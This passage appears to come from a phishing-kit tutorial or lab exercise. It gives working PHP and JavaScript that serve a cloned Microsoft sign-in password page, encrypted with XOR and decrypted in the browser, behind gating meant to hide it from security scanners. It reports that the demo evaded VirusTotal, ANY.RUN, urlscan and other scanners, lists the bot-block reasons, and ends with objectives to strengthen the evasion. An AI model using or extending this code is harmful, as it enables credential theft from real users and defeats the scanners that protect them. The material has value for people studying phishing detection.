    }
} else {
    http_response_code(400);
}
?>

```

## RetrievePage.php Implementation
The `retrievePage.php` file checks the request's query parameters, specifically focusing on the `num` query parameter. If this parameter matches the expected value, which is `3`, the file encrypts the phishing content and returns the encrypted content and encryption key. The code below uses the sample Microsoft login page as the phishing page.

```
<?php
header("Content-Type: application/json");

if (!isset($_GET['num']) || intval($_GET['num']) !== 3) {
    http_response_code(403);
    echo json_encode(["error" => "Error loading the page. Please try again later."]);
    exit;
}

$htmlContent = <<<PHISH
<body>
    <div id="overlay" class="overlay"></div>
    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
    <div class="outer">
        <div class="middle">
            <div class="sign-in-box">
                <div class="win-scroll">
                    <div class="logo">
                        <img width="200px" src="https://cdn.pixabay.com/photo/2013/02/12/09/07/microsoft-80658_1280.png" />
                    </div>
                    <div id="display_name" class="display_name">
                        username@domain.com
                    </div>
                    <div class="prompt">
                        Enter password
                    </div>
                    <div id="error">
                        Please enter the password for your Microsoft account.
                    </div>
                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
                </div>
                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
                <div class="buttoncontainer">
                <input type="submit" id="submit" class="button" value="Verify" >
                </div>
            </div>
        </div>
    </div>
</body>
<head>
<title>Sign in to your account</title>
<style>
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
    background-size: cover;
    margin: 0;
}
a {
    color: #0067b8;
    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

.win-scroll {
    box-sizing: border-box;
}
.logo {
    margin-bottom: 10px;
    box-sizing: border-box;
}
.logo_image {
    height: 40px;
}
.display_name {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}
.prompt {
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;
    margin-top: 16px;
    margin-bottom: 15px;
}
#error {
    color: red;
    display: none;
}
.passwordinput {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,.4);
    background-color: rgba(255,255,255,.4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    display: block;
    width: 90%;
    margin-bottom: 15px;
}
.buttoncontainer {
    position: absolute;
    bottom: 72px;
    right: 50px;
    text-align: right;
    width: 100%;
}
.button {
    color: #fff;
    border-color: #0067b8;
    background-color: #0067b8;
    display: block;
    width: 120px;
    position: absolute;
    right: 0px;
    padding: 5px 14px 6px 14px;
}
.button:hover {
    border-color: #0055a6;
    background-color: #0055a6;
}
</style>
</head>
PHISH;

$key = bin2hex(random_bytes(16));
function xorEncryptDecrypt($input, $key, $encode = true) {
    $output = '';
    $keyIndex = 0;
    $keyLength = strlen($key);

    if (!$encode) {
        $input = base64_decode($input);
    }

    for ($i = 0; $i < strlen($input); $i++) {
        $charCode = ord($input[$i]);
        $keyCharCode = ord($key[$keyIndex]);
        $xorCharCode = $charCode ^ $keyCharCode;
        $output .= chr($xorCharCode);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    if ($encode) {
        $output = base64_encode($output);
    }

    return $output;
}

$encryptedContent = xorEncryptDecrypt($htmlContent, $key, true);

echo json_encode(["html" => $encryptedContent, "key" => $key]);
?>

```

## Decrypt.js Implementation
The final component of the implementation is `decrypt.js` which has the client-side `xorEncryptDecrypt` function. The `xorEncryptDecrypt` function decodes the Base64-encoded frontend, decrypts it via XOR decryption, and replaces the page contents with the decrypted frontend content.

```
const encryptedContent = document.getElementById('encrypted').textContent;
const key = document.getElementById('key').textContent;

function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    let keyIndex = 0;

    if (!encode) {
        input = atob(input);
    }

    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i) ^ key.charCodeAt(keyIndex);
        output += String.fromCharCode(charCode);
        keyIndex = (keyIndex + 1) % key.length;
    }

    return encode ? btoa(output) : output;
}

const decryptedHtml = xorEncryptDecrypt(encryptedContent, key, false);
document.write(decryptedHtml);

```

## Demo

- The video below demonstrates that when a user passes the bot checks, requests are sent to `retrievePage.php` until the `num` parameter equals `3`, at which point the phishing page is returned.

The video can be found in folder: `./videos/demo-1-antibot-lib.mov`

- The next demo showcases the dynamic encryption, which updates the content with each page reload.

The video can be found in folder: `./videos/demo-2-antibot-lib.mov`

- If a user is blocked, a request is sent to `block.php`, the `user_blocked` cookie is set, and an error page is displayed.

The video can be found in folder: `./videos/demo-3-antibot-lib.mov`

## Scan Results
The demo website was accessed or scanned by VirusTotal, ANY.RUN, Browserling, Cloudflare Scanner, Urlscan.io, SafeToOpen, CriminalIP and all of them were successfully blocked.

### Extracting Failure Reasons
The demo website received dozens of bot hits. The reasons for their blocking can be extracted from the `clientLogs.json` file using the command below:

```
jq '.[].reason' /var/www/clientLogs.json

```
A subset of the results are shown below to reflect which rules are most triggered.

```
// 28
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"
"Data center IP address detected"

// 4
"Web driver detected"
"Web driver detected"
"Web driver detected"
"Web driver detected"

// 3
"Timezone is not whitelisted"
"Timezone is not whitelisted"
"Timezone is not whitelisted"

// 2
"Known crawler user agent detected"
"Known crawler user agent detected"

// 2
"Primary language mismatch"
"Primary language mismatch"

// 2
"Zero round-trip time detected"
"Zero round-trip time detected"

// 1
"Fullscreen mode detected"

```

## Objectives
Modify the provided code to include an aggressiveness level from 1 to 3, where higher levels apply stricter checks and lower levels are more lenient

Add additional bot detection checks to the provided code

Modify the code to ensure there is no continuous block of Base64 embedded in the page


---

